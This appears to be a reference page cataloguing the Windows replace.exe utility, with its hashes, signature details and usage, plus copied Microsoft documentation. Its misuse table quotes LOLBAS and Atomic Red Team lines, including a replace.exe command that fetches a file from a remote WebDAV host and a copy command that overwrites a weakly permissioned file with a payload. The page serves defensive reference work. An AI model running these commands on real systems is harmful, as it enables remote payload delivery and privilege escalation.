---
title: replace.exe | Replace File Utility
---

# replace.exe 

* File Path: `C:\WINDOWS\SysWOW64\replace.exe`
* Description: Replace File Utility
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `387BE17B338B3019EFD19DB8CF71E18D`
SHA1 | `9BC4465E0C966D4513B512CDCA2B723AA098084B`
SHA256 | `643363CFBF63421E68EA7D108D3FECFFCB1AECB27EC5AF679A5AA7E95E1C3664`
SHA384 | `C2322DA347125E65BEAADCAD5A34161812096CD41FBB2421879D68FBD2E28D35FE465959AD9B9F59A7BE24D36EC6CCE1`
SHA512 | `228A0017C1405B8E428CBDF94720EF7CA0F7853D46B5E404BE180B13C23997507E573180E79022E1B4148513AD4ACEACE03CA058055E757BE9275B2CD53DA8F7`
SSDEEP | `384:J8uS0Lkim1bnwt9jO123r9Xmk1g59Fl9W7h/Wgl:J8uS0LkFTwt9jO1IrCNlGz`

## Runtime Data

### Usage (stdout):
```Batchfile
Replaces files.

REPLACE [drive1:][path1]filename [drive2:][path2] [/A] [/P] [/R] [/W]
REPLACE [drive1:][path1]filename [drive2:][path2] [/P] [/R] [/S] [/W] [/U]

  [drive1:][path1]filename Specifies the source file or files.
  [drive2:][path2]         Specifies the directory where files are to be
                           replaced.
  /A                       Adds new files to destination directory. Cannot
                           use with /S or /U switches.
  /P                       Prompts for confirmation before replacing a file or
                           adding a source file.
  /R                       Replaces read-only files as well as unprotected
                           files.
  /S                       Replaces files in all subdirectories of the
                           destination directory. Cannot use with the /A
                           switch.
  /W                       Waits for you to insert a disk before beginning.
  /U                       Replaces (updates) only files that are older than
                           source files. Cannot use with the /A switch.

```

### Usage (stderr):
```Batchfile
Invalid switch - -help

```

### Child Processes:


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: REPLACE.EXE
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `replace.exe` being misused. While `replace.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [cisco_cli_moving_data.yml](https://github.com/Neo23x0/sigma/blob/master/rules/network/cisco/aaa/cisco_cli_moving_data.yml) | `        - 'configure replace'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [AcroRd32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/AcroRd32.yml) | `  - Command: Replace C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe by your binary` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ROCCAT_Swarm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/ROCCAT_Swarm.yml) | `  - Command: Replace ROCCAT_Swarm_Monitor.exe with your binary.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | `Name: Replace.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | `Description: Used to replace file with another file ` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | `  - Command: replace.exe C:\Source\File.cab C:\Destination /A` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | `  - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | `  - Path: C:\Windows\System32\replace.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | `  - Path: C:\Windows\SysWOW64\replace.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Replace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | ` - IOC: Replace.exe getting files from remote server` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [misp_invisimole.json](https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json) | `                "description": "Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [stantinko](https://github.com/eset/malware-ioc/blob/master/stantinko/README.adoc) | `                var c = a[b].toLocaleLowerCase().replace(/(\n)/g, " ").replace(/(\r)/g, "");` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [stantinko](https://github.com/eset/malware-ioc/blob/master/stantinko/README.adoc) | `        a = a.toLowerCase().replace(/(\n)/g, " ").replace(/(\r)/g, "");` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [misp-turla-outlook-event.json](https://github.com/eset/malware-ioc/blob/master/turla/misp-turla-outlook-event.json) | `                        "description": "The Microsoft Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system.[[Citation: Microsoft Component Object Model]] Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[[Citation: GDATA COM Hijacking]] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\n\nDetection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\<\/code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\<\/code>.[[Citation: Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10\n\nData Sources: Windows Registry, DLL monitoring, Loaded DLLs\n\nContributors: ENDGAME",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo](https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc) | `replace:` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [issue_template.md](https://github.com/redcanaryco/atomic-red-team/blob/master/.github/issue_template.md) | ℹ Please replace this with what you did. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [issue_template.md](https://github.com/redcanaryco/atomic-red-team/blob/master/.github/issue_template.md) | ℹ Please replace this with what you expected to happen. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [issue_template.md](https://github.com/redcanaryco/atomic-red-team/blob/master/.github/issue_template.md) | ℹ Please replace this with of what happened instead. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) |   - Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [linux-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md) |   - Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [macos-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/macos-index.md) |   - Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md) | - [Atomic Test #1 - Cron - Replace crontab with referenced file](#atomic-test-1---cron---replace-crontab-with-referenced-file) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md) | ## Atomic Test #1 - Cron - Replace crontab with referenced file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.015.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md) | Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. </blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.009.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.009/T1547.009.md) | Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1551.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1551.006/T1551.006.md) | \| target_date_time \| Date/time to replace original timestamps with \| String \| 01/01/1970 00:00:00\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md) | Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.010/T1574.010.md) | <blockquote>Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.010/T1574.010.md) | Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.010/T1574.010.md) | This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.010/T1574.010.md) | copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file ) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.010/T1574.010.md) | \| malicious_file \| File to replace weak permission file with \| path \| $env:TEMP&#92;T1574.010&#92;T1574.010_malicious_file.txt\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.010/T1574.010.md) | ##### Description: A file to replace the original weak_permission_file. In an attack this would be the malicious file gaining extra privileges | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## replace



Replaces files. If used with the **/a** option, **replace** adds new files to a directory instead of replacing existing files.



### Syntax

```
replace [<Drive1>:][<Path1>]<FileName> [<Drive2>:][<Path2>] [/a] [/p] [/r] [/w] 
replace [<Drive1>:][<Path1>]<FileName> [<Drive2>:][<Path2>] [/p] [/r] [/s] [/w] [/u] 
```

#### Parameters

|Parameter|Description|
|---------|-----------|
|[\<Drive1>:][\<Path1>]\<FileName>|Specifies the location and name of the source file or set of files. *FileName* is required, and can include wildcard characters (**&#42;** and **?**).|
|[\<Drive2>:][\<Path2>]|Specifies the location of the destination file. You cannot specify a file name for files you replace. If you do not specify a drive or path, **replace** uses the current drive and directory as the destination.|
|/a|Adds new files to the destination directory instead of replacing existing files. You cannot use this command-line option with the **/s** or **/u** command-line option.|
|/p|Prompts you for confirmation before replacing a destination file or adding a source file.|
|/r|Replaces Read-only and unprotected files. If you attempt to replace a Read-only file, but you do not specify **/r**, an error results and stops the replacement operation.|
|/w|Waits for you to insert a disk before the search for source files begins. If you do not specify **/w**, **replace** begins replacing or adding files immediately after you press ENTER.|
|/s|Searches all subdirectories in the destination directory and replaces matching files. You cannot use **/s** with the **/a** command-line option. The **replace** command does not search subdirectories that are specified in *Path1*.|
|/u|Replaces only those files on the destination directory that are older than those in the source directory. You cannot use **/u** with the **/a** command-line option.|
|/?|Displays help at the command prompt.|

### Remarks

- As **replace** adds or replaces files, the file names are displayed on the screen. After **replace** is finished, a summary line is displayed in one of the following formats:  
  ```
  nnn files added
  nnn files replaced
  no file added
  no file replaced
  ```  
- If you are using floppy disks and you need to switch disks during the **replace** operation, you can specify the **/w** command-line option so that **replace** will wait for you to switch the disks.
- You cannot use **replace** to update hidden files or system files.
- The following table shows each exit code and a brief description of its meaning:  
  |Exit code|Description|
  |---------|-----------|
  |0|The **replace** command successfully replaced or added the files.|
  |1|The **replace** command encountered an incorrect version of MS-DOS.|
  |2|The **replace** command could not find the source files.|
  |3|The **replace** command could not find the source or destination path.|
  |5|The user does not have access to the files that you want to replace.|
  |8|There is insufficient system memory to carry out the command.|
  |11|The user used the wrong syntax on the command line.|

> [!NOTE]
> You can use the ERRORLEVEL parameter on the **if** command line in a batch program to process exit codes that are returned by **replace**.

### <a name="BKMK_examples"></a>Examples

To update all the versions of a file named Phones.cli (which appear in multiple directories on drive C), with the latest version of the Phones.cli file from a floppy disk in drive A, type:

`replace a:\phones.cli c:\ /s`

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020 Strontic.


